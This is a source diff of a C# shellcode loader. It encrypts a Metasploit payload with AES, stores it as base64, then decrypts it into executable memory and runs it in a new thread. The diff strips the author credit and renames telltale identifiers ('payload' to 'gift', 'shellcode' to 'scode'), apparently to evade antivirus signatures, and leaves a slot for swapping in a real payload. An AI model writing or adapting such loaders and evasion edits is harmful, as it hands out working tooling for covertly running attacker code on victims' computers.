@@ -1,23 +1,14 @@
-﻿using System;
+using System;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 
 
-/*-----------------------------------------------
- * Simple-Loader.exe: Simple Shellcode Loader   |
- *                                              |
- * Author: @jfaust0                             |
- * Contact: joshua.faust@sevrosecurity.com      |
- * Website: SevroSecurity.com                   |
- * ---------------------------------------------*/
-
-
-namespace goodTimes
+namespace woSec
 {
     class Program
     {
-        // CHANGE THESE VALUES --> Seriosuly, these should not be hard coded!
+        // CHANGE THESE VALUES
         public static byte[] key = new byte[] { 0x33, 0xED, 0x8A, 0x15, 0xD9, 0x26, 0xC5, 0x1C, 0x95, 0xF1, 0x4C, 0x11, 0xE4, 0x37, 0xD4, 0x5B, 0xE8, 0xDD, 0x8E, 0xED, 0xDC, 0x01, 0x38, 0xC7 };
         public static byte[] iv = new byte[] { 0x2B, 0x6F, 0xD1, 0xE3, 0x59, 0x6F, 0xC3, 0x31, 0x62, 0xC9, 0x98, 0x55, 0x7B, 0x00, 0xCB, 0xD1 };
 
@@ -25,9 +16,9 @@ namespace goodTimes
         static void Main(string[] args)
         {
             String app_name = AppDomain.CurrentDomain.FriendlyName;
-            String usage = $"Usage: {app_name} <path_to_metasploit_payload>";
+            String usage = $"Usage: {app_name} <path_to_msf_gift>";
 
-            // ENCRYPT PAYLOAD
+            // ENCRYPT GIFT
             if (args.Length == 1)
             {
                 if (!File.Exists($@"{args[0]}"))
@@ -38,7 +29,7 @@ namespace goodTimes
 
                 Console.WriteLine("[i] Encrypting Data");
 
-                // Read in MetaSploit Byte[] Code from File
+                // Read in MSF Byte[] Code from File
                 String fileData = System.IO.File.ReadAllText($@"{args[0]}");
                 String tmp = (fileData.Split('{')[1]).Split('}')[0];
 
@@ -50,8 +41,8 @@ namespace goodTimes
 
                 // Encrypt and Encode the data:
                 byte[] e_data = Encrypt(data, key, iv);
-                String finalPayload = Convert.ToBase64String(e_data);
-                Console.WriteLine($"[i] Replace the hiphop variable with your new payload:\n\n\t String hiphop = " + '"' + $"{finalPayload}" + '"' + ';');
+                String finalGift = Convert.ToBase64String(e_data);
+                Console.WriteLine($"[i] Replace the jazz variable with your new gift:\n\n\t String jazz = " + '"' + $"{finalGift}" + '"' + ';');
 
                 Environment.Exit(0);
             }
@@ -61,27 +52,27 @@ namespace goodTimes
                 Console.WriteLine(usage);
                 Environment.Exit(1);
             }
-            // RUN PAYLOAD 
+            // RUN GIFT 
             else
             {
-                // msfvenom -p windows/exe cmd=calc.exe -f csharp --> CHANGE ME!
-                String hiphop = "ZxOy1BksVfrlq8wcmyHY8GwwiBZd8NGrGQiKvx15hcv9sQ9apoO6NGbNBxAeS4NLHSz4owcdPgQTTejYJr80Ke4ynoy41yrc5RD0uqt1ppyxDAeYGATQy7xFbN247gwFee5cPZAFyBzbI6DvOLBFSJiP64kv5T7pX3iapVsX7ORmg7Ubfa1M9PcYNm5qzS9dyHxFdeD578YA6DGYC0UPzmeDXB11R0MWmPAkRGFftQp + YdurMHce1R4HC9bQ0gtm / MLHIP / UTPbIUtwrEAqQ / SYJcJCmeCPynYLNYrn9ae1xvCBokUTgdK + gpUa58ss2F4F60p1ujZNHmQ1Bn39WZmK5R4wSVmdFJpKRZXeGycAziEVlGjsS7XDKsvQvWvaZKqealuTWxH9q6n++zrRJZ0TBorjcFHKJZOLK5bNgKx0DbmFHXz + KBH400o";
+                //CHANGE ME!
+                String jazz = "ZxOy1BksVfrlq8wcmyHY8GwwiBZd8NGrGQiKvx15hcv9sQ9apoO6NGbNBxAeS4NLHSz4owcdPgQTTejYJr80Ke4ynoy41yrc5RD0uqt1ppyxDAeYGATQy7xFbN247gwFee5cPZAFyBzbI6DvOLBFSJiP64kv5T7pX3iapVsX7ORmg7Ubfa1M9PcYNm5qzS9dyHxFdeD578YA6DGYC0UPzmeDXB11R0MWmPAkRGFftQp + YdurMHce1R4HC9bQ0gtm / MLHIP / UTPbIUtwrEAqQ / SYJcJCmeCPynYLNYrn9ae1xvCBokUTgdK + gpUa58ss2F4F60p1ujZNHmQ1Bn39WZmK5R4wSVmdFJpKRZXeGycAziEVlGjsS7XDKsvQvWvaZKqealuTWxH9q6n++zrRJZ0TBorjcFHKJZOLK5bNgKx0DbmFHXz + KBH400o";
 
-                byte[] de_data = Decrypt(Convert.FromBase64String(hiphop), key, iv);
+                byte[] de_data = Decrypt(Convert.FromBase64String(jazz), key, iv);
                 nonsense(de_data);
             }
 
         }
-
-        // Shell Code Loader
-        public static bool nonsense(byte[] shellcode)
+        
+        // S Code Loader
+        public static bool nonsense(byte[] scode)
         {
 
             try
             {
-                UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
+                UInt32 funcAddr = VirtualAlloc(0, (UInt32)scode.Length,
                     MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-                Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
+                Marshal.Copy(scode, 0, (IntPtr)(funcAddr), scode.Length);
                 IntPtr hThread = IntPtr.Zero;
                 UInt32 threadId = 0;
                 IntPtr pinfo = IntPtr.Zero;
@@ -97,8 +88,8 @@ namespace goodTimes
                 return false;
             }
         }
-
-        // Used to Load Shellcode into Memory:
+        
+        // Used to Load Scode into Memory:
         private static UInt32 MEM_COMMIT = 0x1000;
         private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
 
@@ -136,7 +127,7 @@ namespace goodTimes
 
                 using (var encryptor = aes.CreateEncryptor(aes.Key, aes.IV))
                 {
-                    return PerformCryptography(data, encryptor);
+                    return PCrypt(data, encryptor);
                 }
             }
         }
@@ -154,12 +145,12 @@ namespace goodTimes
 
                 using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                 {
-                    return PerformCryptography(data, decryptor);
+                    return PCrypt(data, decryptor);
                 }
             }
         }
 
-        private static byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
+        private static byte[] PCrypt(byte[] data, ICryptoTransform cryptoTransform)
         {
             using (var ms = new MemoryStream())
             using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
@@ -170,6 +161,6 @@ namespace goodTimes
                 return ms.ToArray();
             }
         }
-
+        
     }
 }
